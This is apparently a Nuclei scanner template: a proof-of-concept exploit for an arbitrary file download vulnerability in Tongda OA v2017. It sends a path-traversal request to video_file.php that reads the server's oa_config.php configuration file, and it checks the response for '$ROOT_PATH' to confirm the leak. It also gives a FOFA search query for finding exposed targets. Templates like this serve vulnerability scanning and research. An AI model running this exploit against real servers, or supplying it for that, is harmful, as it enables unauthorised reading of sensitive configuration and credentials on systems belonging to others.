# Add your nuclei formatted PoC!
id: Tongda-OA-Video_file-download

info:
  name: Tongda OA file download
  author: cr
  severity: high
  description: Tongda-OA-file-download
  tags: Tongda,file-download,Video_file

requests:
  - method: GET
    path:
      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "$ROOT_PATH"
        part: body

      - type: status
        status:
          - 200

#fofa-query:app="TDXK-通达OA"
help: 通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件
author: cr
